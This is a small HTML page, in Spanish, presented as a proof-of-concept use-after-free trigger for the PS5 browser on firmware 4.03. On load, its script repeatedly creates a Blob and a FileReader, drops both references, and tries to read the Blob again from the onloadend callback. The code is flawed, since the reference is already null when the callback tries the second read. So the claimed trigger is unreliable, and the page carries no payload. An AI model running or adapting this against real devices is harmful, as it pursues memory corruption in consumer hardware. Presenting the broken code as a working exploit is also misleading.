<!DOCTYPE html>
<html>
<head><title>PoC Use-After-Free Agresivo PS5 4.03</title></head>
<body>
<h1>Prueba Use-After-Free Agresivo FileReader</h1>
<script>
function aggressiveUAF() {
    let count = 0;
    const total = 100;
    const intervalMs = 50;

    function createAndFree() {
        if (count >= total) {
            console.log("Test terminado.");
            return;
        }

        try {
            // Blob más grande
            let blob = new Blob([new Array(1000).fill('A').join('')], { type: "text/plain" });

            // Crear FileReader
            let fr = new FileReader();

            fr.onloadend = function() {
                try {
                    // Intento de read después de carga para forzar potencial UAF
                    fr.readAsText(blob);
                } catch (e) {
                    console.log("Error lectura:", e);
                }
            };

            fr.readAsText(blob);

            // Liberar la referencia
            fr = null;
            blob = null;
        } catch (e) {
            console.log("Error general:", e);
        }

        count++;
        setTimeout(createAndFree, intervalMs);
    }

    createAndFree();
}

window.onload = aggressiveUAF;
</script>
</body>
</html>
